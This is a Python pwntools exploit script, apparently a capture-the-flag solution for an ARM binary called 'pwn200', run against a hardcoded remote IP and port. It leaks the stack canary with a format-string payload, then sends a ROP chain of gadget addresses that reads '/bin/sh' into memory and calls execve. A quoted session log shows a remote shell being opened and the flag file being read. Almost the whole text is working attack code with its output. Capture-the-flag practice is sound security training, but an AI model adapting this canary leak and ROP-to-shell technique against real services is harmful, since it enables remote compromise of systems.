#!/usr/bin/env python
from pwn import *

r = remote('165.227.98.55', 7777)

r.sendlineafter('>', '%517$p')
canary = r.recvuntil('I').strip(' ').strip('I')
log.success('Leaked canary: {}'.format(canary))

rop_chain  = ''
rop_chain += 'A' * 1024
rop_chain += p32(int(canary, 16))
rop_chain += 'A' * 12
rop_chain += p32(0x70068)  # pop {r0, lr}; bx lr; 
rop_chain += p32(0x0)      # fd (stdin)
rop_chain += p32(0x70590)  # pop {r1, lr}; bx lr;
rop_chain += p32(0x99ed8)  # buff (bss)
rop_chain += p32(0x1d718)  # pop {r4, r5, lr}; bx lr;
rop_chain += p32(0x11100)  # pop {lr}; bx lr;
rop_chain += p32(0x7)      # count
rop_chain += p32(0x3786c)  # mov r2, r5; mov lr, pc; bx r4;
rop_chain += p32(0x19d20)  # pop {r7, lr}; bx lr; 
rop_chain += p32(0x3)      # syscall read
rop_chain += p32(0x53520)  # svc #0; pop {r4, r5, r6, r7, r8, lr}; bx lr;
rop_chain += p32(0x0)      # r4
rop_chain += p32(0x0)      # r5
rop_chain += p32(0x0)      # r6
rop_chain += p32(0x0b)     # syscall execve
rop_chain += p32(0x0)      # r8
rop_chain += p32(0x70068)  # pop {r0, lr}; bx lr;
rop_chain += p32(0x99ed8)  # buff (bss)
rop_chain += p32(0x70590)  # pop {r1, lr}; bx lr;
rop_chain += p32(0x0)      # NULL
rop_chain += p32(0x1d718)  # pop {r4, r5, lr}; bx lr;
rop_chain += p32(0x11100)  # pop {lr}; bx lr;
rop_chain += p32(0x0)      # NULL
rop_chain += p32(0x3786c)  # mov r2, r5; mov lr, pc; bx r4;
rop_chain += p32(0x53520)  # svc #0; pop {r4, r5, r6, r7, r8, lr}; bx lr;

r.sendlineafter('>', rop_chain)
r.send('/bin/sh')
r.interactive()

'''
[+] Opening connection to 165.227.98.55 on port 7777: Done
[+] Leaked canary: 0xf5d35a00
[*] Switching to interactive mode
$ cat /home/pwn200/flag.txt
h4ck1t{Sarah_would_be_proud}
'''